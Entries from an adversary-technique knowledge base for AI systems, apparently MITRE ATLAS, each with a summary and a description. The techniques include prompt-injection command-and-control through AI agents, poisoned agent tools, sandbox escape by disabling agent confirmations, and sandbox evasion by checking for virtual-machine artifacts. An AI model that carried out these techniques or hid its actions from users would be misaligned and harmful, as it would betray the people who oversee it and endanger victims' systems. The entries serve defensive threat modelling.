text: Search Open Websites/Domains is a technique where adversaries search public websites and domains to gather information about victims for targeting purposes. This process involves scanning various online sources, including social media, news sites, and domains owned by the victim. Adversaries often utilize search engines with precise queries to identify the specific software platforms or services the victim employs. This reconnaissance phase is typically used to inform subsequent attacks, such as exploiting public-facing applications or performing prompt infiltration.
name: Search Open Websites/Domains
description:
Adversaries may search public websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or domains owned by the victim.

Adversaries may find the information they seek to gather via search engines. They can use precise search queries to identify software platforms or services used by the victim to use in targeting. This may be followed by [Exploit Public-Facing Application](/techniques/AML.T0049) or [Prompt Infiltration via Public-Facing Application](/techniques/AML.T0093).

text:
Code Repositories is a technique where adversaries search public code hosting platforms, such as GitHub, GitLab, SourceForge, and BitBucket, to gather information about a victim or their systems for targeting purposes. By analyzing repositories containing code or artifacts related to AI systems, attackers can identify the specific AI frameworks, libraries, models, datasets, agents, and tools being utilized.

Beyond technical specifications, these repositories may reveal employee names or highly sensitive data, such as accidentally leaked API keys and credentials. The information harvested from public code repositories serves as a foundation for further malicious activities, including broader reconnaissance, the acquisition of public AI artifacts, system discovery, and gaining initial access through phishing or the use of valid accounts.
name: Code Repositories
description:
Adversaries may search public code repositories for information about a victim or victim system that can be used during targeting. Victims may store code or artifacts related to their AI systems in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Adversaries may search code repositories of common AI tools, frameworks, models, or agentic systems that are used--but not owned--by the victim.

Public code repositories can often be a source of various information about victims, such as commonly used AI frameworks, libraries, models, datasets, agents, and agent tools, as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys (ex: [Credentials from AI Agent Configuration](/techniques/AML.T0083)). Information from these sources may reveal opportunities for other forms of [Reconnaissance](/tactics/AML.TA0002) (ex: [Gather RAG-Indexed Targets](/techniques/AML.T0064)), establishing operational resources (ex: [Acquire Public AI Artifacts](/techniques/AML.T0002)), [Discovery](/tactics/AML.TA0008) (ex: [Discover AI Agent Configuration](/techniques/AML.T0084)) and/or [Initial Access](/tactics/AML.TA0004) (ex: [Valid Accounts](/techniques/AML.T0012) or [Phishing](/techniques/AML.T0052)).

text: AI Service API is a technique where adversaries use the application programming interface of an AI service on a victim's system to establish a command and control channel. By embedding commands and results within the normal traffic of the AI service, the adversary can blend their activities with legitimate communications to avoid detection. This approach allows the attacker to live off the land by utilizing existing infrastructure on the system, thereby reducing their footprint. This technique is typically employed when an adversary seeks to remain stealthy and maintain long-term persistence for espionage activities.
name: AI Service API
description:
Adversaries may communicate using the API of an AI service on the victim's system. The adversary's commands to the victim system, and often the results, are embedded in the normal traffic of the AI service.

An AI service API command and control channel is covert because the adversary's commands blend in with normal communications, so an adversary may use this technique to avoid detection. Using existing infrastructure on the victim's system allows the adversary to live off the land, further reducing their footprint.

AI service APIs may be abused as C2 channels when an adversary wants to be stealthy and maintain long-term persistence for espionage activities [\[1\]][1].

[1]: https://www.microsoft.com/en-us/security/blog/2025/11/03/sesameop-novel-backdoor-uses-openai-assistants-api-for-command-and-control/

text:
Virtualization/Sandbox Evasion is a technique used by adversaries to detect and avoid virtual machine environments (VMEs) and analysis sandboxes. By identifying artifacts indicative of a virtualized environment, attackers can alter the behavior of their malware to disengage from the victim or conceal the implant's core functions. This evasion often occurs before the delivery of secondary or additional payloads to ensure the environment is not being monitored by security researchers.

To achieve this, adversaries search for specific system artifacts, such as registry keys, environment variables, or running processes associated with platforms like VMware, VirtualBox, QEMU, and Parallels. They may also check for specific NIC MAC address prefixes or the presence of security monitoring tools, including Wireshark and Sysinternals, to determine if the system is an analysis environment.
name: Virtualization/Sandbox Evasion
description:
Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads.

Adversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization such as registry keys (e.g. substrings matching Vmware, VBOX, QEMU), environment variables (e.g. substrings matching VBOX, VMWARE, PARALLELS), NIC MAC addresses (e.g. prefixes 00-05-69 (VMWare) or 08-00-27 (VirtualBox)), running processes (e.g. vmware.exe, vboxservice.exe, qemu-ga.exe) [\[1\]][1].

[1]: https://research.checkpoint.com/2025/ai-evasion-prompt-injection/

text: AI Agent Tool Credential Harvesting is a technique where adversaries leverage their access to an AI agent on a victim's system to retrieve credentials from the agent's available tools. Because AI agents often integrate with a wide variety of data sources, they can be used as a conduit to collect sensitive information from document stores like SharePoint, OneDrive, or Google Drive, as well as code repositories such as GitHub and GitLab. Additionally, this technique may target enterprise productivity tools, including email providers and Slack, or local notetaking applications like Obsidian and Apple Notes, to extract credentials.
name: AI Agent Tool Credential Harvesting
description: Adversaries may attempt to use their access to an AI agent on the victim's system to retrieve data from available agent tools to collect credentials. Agent tools may connect to a wide range of sources that may contain credentials including document stores (e.g. SharePoint, OneDrive or Google Drive), code repositories (e.g. GitHub or GitLab), or enterprise productivity tools (e.g. as email providers or Slack), and local notetaking tools (e.g. Obsidian or Apple Notes).

text: AI Agent Tool Data Poisoning is a technique where adversaries place malicious content on a victim's system to be retrieved by an AI agent tool. This is typically achieved by positioning documents in locations that are ingested by services the AI agent is configured to use. The malicious content is often targeted to ensure it is frequently retrieved by common queries and may contain false or misleading information, as well as prompt injections designed to force the agent to execute malicious instructions.
name: AI Agent Tool Data Poisoning
description:
Adversaries may place malicious content on a victim's system where it can be retrieved by an AI Agent Tool. This may be accomplished by placing documents in a location that will be ingested by a service the AI agent has associated tools for.

The content may be targeted such that it would often be retrieved by common queries. The adversary's content may include false or misleading information. It may also include prompt injections with malicious instructions.

text: AI Agent Clickbait is a technique where adversaries craft deceptive web content to bait computer-using AI agents or AI web browsers into taking unintended actions. By exploiting the agent's interpretation of visual cues, UI content, or prompt-like language embedded within a site, attackers can trick the agent into clicking buttons, navigating to specific pages, or copying code. If successful, this technique can lead the AI agent to inadvertently copy and execute malicious code on the user's operating system.
name: AI Agent Clickbait
description: Adversaries may craft deceptive web content designed to bait Computer-Using AI agents or AI web browsers into taking unintended actions, such as clicking buttons, copying code, or navigating to specific web pages. These attacks exploit the agent's interpretation of UI content, visual cues, or prompt-like language embedded in the site. When successful, they can lead the agent to inadvertently copy and execute malicious code on the user's operating system.

text: Data Destruction via AI Agent Tool Invocation is a technique where adversaries trigger an AI agent's tool capable of performing mutative operations to destroy data. By invoking these tools, attackers can delete files and data on specific systems or across an entire network, aiming to interrupt the availability of critical systems, services, and network resources.
name: Data Destruction via AI Agent Tool Invocation
description: Adversaries may invoke an AI agent's tool capable of performing mutative operations to perform Data Destruction. Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources.

text:
Generate Malicious Commands is a technique where adversaries use large language models to dynamically create malicious commands from natural language. By leveraging AI to generate these commands, attackers can create constantly changing attack signatures that are more difficult for security systems to detect. This capability allows adversaries to adapt their tactics rapidly to suit different target environments.

To execute this technique, attackers may use LLMs already present within a victim's environment or connect to externally hosted AI services. Because the prompts used to generate malicious code often resemble legitimate user interactions, this activity can easily blend in with normal network traffic.
name: Generate Malicious Commands
description:
Adversaries may use large language models (LLMs) to dynamically generate malicious commands from natural language. Dynamically generated commands may be harder detect as the attack signature is constantly changing. AI-generated commands may also allow adversaries to more rapidly adapt to different environments and adjust their tactics.

Adversaries may utilize LLMs present in the victim's environment or call out to externally hosted services. [APT28](https://attack.mitre.org/groups/G0007) utilized a model hosted on HuggingFace in a campaign with their LAMEHUG malware [\[1\]][1]. In either case prompts to generate malicious code can blend in with normal traffic.

[1]: https://logpoint.com/en/blog/apt28s-new-arsenal-lamehug-the-first-ai-powered-malware

text:
Deploy AI Agent is a technique where adversaries launch AI agents within a victim's environment to execute actions on their behalf. These agents often possess access to diverse tools, data sources, and permissions that allow them to interact with various services and systems.

To implement this technique, an adversary typically configures the AI agent with an initial system prompt and specific tool access to define its goals. To ensure the agent's operations are not interrupted, the adversary may grant it excessive trust permissions and disable requirements for user interaction.

By deploying an AI agent, the adversary enables autonomous behavior, allowing the agent to make independent decisions on how to achieve its objectives. However, this autonomy also introduces a level of risk, as it represents a partial loss of direct control for the adversary.
name: Deploy AI Agent
description:
Adversaries may launch AI agents in the victim's environment to execute actions on their behalf. AI agents may have access to a wide range of tools and data sources, as well as permissions to access and interact with other services and systems in the victim's environment. The adversary may leverage these capabilities to carry out their operations.

Adversaries may configure the AI agent by providing an initial system prompt and granting access to tools, effectively defining their goals for the agent to achieve. They may deploy the agent with excessive trust permissions and disable any user interactions to ensure the agent's actions aren't blocked.

Launching an AI agent may provide for some autonomous behavior, allowing for the agent to make decisions and determine how to achieve the adversary's goals. This also represents a loss of control for the adversary.

text: Publish Poisoned AI Agent Tool is a technique where adversaries create and distribute malicious AI agent tools to compromise systems. These poisoned tools often incorporate LLM prompt injections, which can lead to various negative impacts when the tool is utilized by an AI agent. Adversaries typically publish these tools to open-source version control repositories, package registries, or specialized tool-sharing hubs, many of which are unregulated. Additionally, these malicious tools may be deployed and provided as remotely hosted servers.
name: Publish Poisoned AI Agent Tool
description:
Adversaries may create and publish poisoned AI agent tools. Poisoned tools may contain an [LLM Prompt Injection](/techniques/AML.T0051), which can lead to a variety of impacts.

Tools may be published to open source version control repositories (e.g. GitHub, GitLab), to package registries (e.g. npm), or to repositories specifically designed for sharing tools (e.g. OpenClaw Hub). These registries may be largely unregulated and may contain many poisoned tools [\[1\]][1]. Tools may also be published as remotely hosted servers [\[2\]][2].

[1]: https://opensourcemalware.com/blog/clawdbot-skills-ganked-your-crypto
[2]: https://mcpservers.org/remote-mcp-servers

text: Escape to Host is a technique where adversaries break out of a container or virtualized environment to gain access to the underlying host system. This action allows an attacker to move beyond the isolated environment to access the host itself or other containerized and virtualized resources residing on that host. While containerized and virtualized resources are intended to provide a clear separation of application functionality and isolation from the host, various vulnerabilities can be exploited to bypass these boundaries. In the context of AI systems, an adversary might achieve this by modifying an AI agent's configuration to disable safety features or user confirmations, enabling the invocation of tools that execute directly on the host environment rather than within the designated sandbox.
name: Escape to Host
description:
Adversaries may break out of a container or virtualized environment to gain access to the underlying host. This can allow an adversary access to other containerized or virtualized resources from the host level or to the host itself. In principle, containerized / virtualized resources should provide a clear separation of application functionality and be isolated from the host environment.

There are many ways an adversary may escape from a container or sandbox environment via AI Systems. For example, modifying an AI Agent's configuration to disable safety features or user confirmations could allow the adversary to invoke tools to be run on host environments rather than in the sandbox.

text: Exploitation for Credential Access is a technique where adversaries exploit software vulnerabilities to collect credentials. This process occurs when an attacker takes advantage of a programming error within a program, service, operating system software, or the kernel to execute adversary-controlled code, allowing them to gain unauthorized access to sensitive authentication data.
name: Exploitation for Credential Access
description: Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.

text: Exploitation for Defense Evasion is a technique where adversaries exploit vulnerabilities within a system or application to bypass security features. This process occurs when an attacker takes advantage of programming errors in a program, service, operating system software, or the kernel to execute adversary-controlled code. Such vulnerabilities may specifically exist within defensive security software, allowing adversaries to disable or circumvent protections to maintain undetected access.
name: Exploitation for Defense Evasion
description: Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.

text:
AI Agent is a technique where adversaries abuse AI agents residing on a victim's system to establish and maintain command and control. Because AI agents are frequently granted permissions to execute shell commands, access the internet, and interact with various internal services, they can be repurposed as capable command and control agents.

Adversaries may manipulate an agent's behavior through prompt injection, leveraging the agent's tool-invocation capabilities to retrieve and execute malicious commands. To ensure long-term access, attackers may use context poisoning or modify the agent's configuration to maintain persistent control. Additionally, adversaries may instruct the agent to suppress reporting its activities to the user to remain covert within the environment.
name: AI Agent
description:
Adversaries may abuse AI agents present on the victim's system for command and control. AI agents are often granted access to tools that can execute shell commands, reach out to the internet, and interact with other services in the victim's environment, making them capable C2 agents.

The adversary may modify the behavior of an AI agent for C2 via [LLM Prompt Injection](/techniques/AML.T0051) and rely on the agent's ability to invoke tools to retrieve and execute the adversary's commands. They may maintain persistent control of an agent via [Modify AI Agent Configuration](/techniques/AML.T0081) or [AI Agent Context Poisoning](/techniques/AML.T0080). They may instruct the agent to not report their actions to the user in an attempt to remain covert.

text: AI Supply Chain Rug Pull is a technique where adversaries publish legitimate AI components or software to gain user adoption and trust before pushing a malicious update. This method exploits the fact that security scrutiny is typically highest when a dependency is first integrated into an AI system; by establishing a trusted reputation first, attackers can bypass these initial defenses to achieve initial access and compromise the AI supply chain. To execute this, adversaries may publish poisoned models, datasets, or AI agent tools, often utilizing reputation inflation techniques to increase the adoption rate of the component before introducing the malicious variant.
name: AI Supply Chain Rug Pull
description:
Adversaries may publish legitimate AI components or software, gain user adoption, then push an update with a malicious variant, leading to [AI Supply Chain Compromise](/techniques/AML.T0010). More scrutiny is often placed on a supply chain dependency when it is first being considered for inclusion in an AI system. Performing a rug pull may allow adversaries to bypass these defenses and be more likely to achieve [Initial Access](/tactics/AML.TA0004).

Adversaries may publish malicious AI components via [Publish Poisoned Models](/techniques/AML.T0058), [Publish Poisoned Datasets](/techniques/AML.T0019), or [Publish Poisoned AI Agent Tool](/techniques/AML.T0104).

Adversaries may use other techniques (See [AI Supply Chain Reputation Inflation](/techniques/AML.T0111)) to gain user trust and increase adoption before performing the rug pull.

text: AI Agent Tool Poisoning is a technique where adversaries achieve persistence by compromising the tools used by AI agents, including built-in tools or those connected via the Model Context Protocol. By altering the behavior of benign tools already integrated into the agent's environment, attackers can maintain long-term influence over the agent's decisions, actions, and external interactions. This is typically achieved by modifying tool parameters and descriptions, injecting hidden logic, or redirecting outputs. Once poisoned, these tools can silently exfiltrate data, execute unauthorized commands, or manipulate downstream processes without raising suspicion.
name: AI Agent Tool Poisoning
description:
Adversaries may achieve persistence by poisoning tools used by AI agents including built-in tools or tools available to the agent via Model Context Protocol (MCP) connections. This involves compromising benign tools already integrated into the agent's environment.

By altering tool behavior such as modifying parameters or descriptions, injecting hidden logic, or redirecting outputs, attackers can maintain long-term influence over the agent's actions, decisions, or external interactions. Poisoned tools may silently exfiltrate data, execute unauthorized commands, or manipulate downstream processes without raising suspicion.

text:
AI Supply Chain Reputation Inflation is a technique that involves building or leveraging credible trust signals to increase the perceived legitimacy of AI supply chain components, with the goal of driving the adoption of malicious or compromised assets. 

Adversaries employ this method by using established developer accounts with a history of legitimate contributions to publish AI models, datasets, packages, and MCP servers that appear trustworthy. They cultivate reputation through authentic adoption signals, such as GitHub stars, forks, and high download counts, and may release benign versions of a component before introducing malicious updates. By relying on authentic history and usage patterns, these components are more likely to pass both human and automated trust checks, allowing them to be adopted without scrutiny.
name: AI Supply Chain Reputation Inflation
description:
AI Supply Chain Reputation Inflation is the process of building or leveraging genuinely credible-looking trust signals to increase the perceived legitimacy of AI supply chain components, with the goal of driving adoption of malicious or compromised assets.

Adversaries use established developer accounts with a history of legitimate projects and contributions to publish AI models, datasets, packages, and MCP servers that appear trustworthy. They build reputation through real adoption signals such as downloads, GitHub stars, forks, and inclusion in dependency chains, often releasing benign versions before introducing malicious updates via [AI Supply Chain Rug Pull](/techniques/AML.T0109).

By relying on authentic history and usage patterns, these components pass both human and automated trust checks, increasing the likelihood they are adopted without scrutiny.

text: Machine Compromise is a technique where adversaries gain control of a system by exploiting or manipulating its AI-enabled components. By compromising a victim machine, an attacker can execute arbitrary code, steal sensitive credentials, exfiltrate data, and establish a persistent presence on the system. This can be achieved by targeting local AI agents to inherit their specific capabilities and permissions, or by utilizing AI artifacts that contain embedded malware.
name: Machine Compromise
description:
Adversaries may compromise a machine by exploiting or manipulating AI-enabled components on the system. Compromising a victim system allows the adversary to execute arbitrary code, steal credentials, exfiltrate data, and continue to persist on the system.

Adversaries may target a [Local AI Agent](/techniques/AML.T0112.000) which if compromised grants them the capabilities and permissions of the agent, or [AI Artifacts](/techniques/AML.T0112.001) which can contain embedded malware.

text: Local AI Agent is a technique where adversaries achieve full system compromise by abusing AI agents running locally on a host, such as AI-driven browsers or computer-use agents. These agents are designed to autonomously interact with the operating system, applications, and external services, often possessing broad permissions to execute commands, manage credentials, access files, and control user workflows. By taking control of an AI agent's behavior, an adversary effectively gains the same level of access as the agent, which can lead to complete control over the machine. This allows the attacker to execute arbitrary code, modify system configurations, establish persistence, and access or exfiltrate sensitive data.
name: Local AI Agent
description:
Adversaries may achieve full system compromise by abusing AI agents running locally on a host, such as computer-use agents or AI-driven browsers. These agents are designed to autonomously interact with the operating system, applications, and external services, often with broad permissions to execute commands, access files, manage credentials, and control user workflows.

If an adversary is able to take control of an AI agent's behavior, they effectively gain the same level of access as the agent. This can result in complete control over the machine, including executing arbitrary code, accessing or exfiltrating sensitive data, modifying system configurations, and establishing persistence.

text: AI Artifacts is a technique where adversaries achieve full system compromise by introducing malicious AI models or data containing embedded malware or malicious commands. These artifacts are typically stored in model registries or data stores, allowing them to potentially affect numerous systems that retrieve and utilize these resources. The malicious content within these AI artifacts is often executed through the use of unsafe serialization formats, such as Python pickle, or via bundled scripts and notebooks.
name: AI Artifacts
description:
Adversaries may achieve full system compromise by introducing malicious AI artifacts, such as models or data, that contain embedded malware or other malicious commands. AI artifacts are often stored in model registries or data stores and may affect many systems that pull these resources.

Malicious content stored in AI artifacts may be executed as a result of unsafe serialization formats (e.g. Python pickle) or by other bundled scripts or notebooks.

text: Limit Public Release of Information is a mitigation strategy that involves restricting the disclosure of technical details regarding the AI stack used in an organization's products or services. By limiting the availability of technical knowledge, organizations prevent adversaries from using that information to perform precise targeting or tailoring attacks to specific system vulnerabilities. This approach also includes restricting the release of organizational data, such as physical locations, researcher names, and department structures, as these details can be used to infer sensitive information about AI techniques, model architectures, or the datasets being utilized.
name: Limit Public Release of Information
description: Limit the public release of technical information about the AI stack used in an organization's products or services. Technical knowledge of how AI is used can be leveraged by adversaries to perform targeting and tailor attacks to the target system. Additionally, consider limiting the release of organizational information - including physical locations, researcher names, and department structures - from which technical details such as AI techniques, model architectures, or datasets may be inferred.

text: Limit Model Artifact Release is a mitigation strategy that restricts the public disclosure of technical project details. This practice involves limiting the release of sensitive components such as data, algorithms, model architectures, and model checkpoints that are either used directly in production or are representative of production systems. By controlling the availability of these artifacts, the strategy aims to protect the integrity and security of the production environment.
name: Limit Model Artifact Release
description: Limit public release of technical project details including data, algorithms, model architectures, and model checkpoints that are used in production, or that are representative of those used in production.
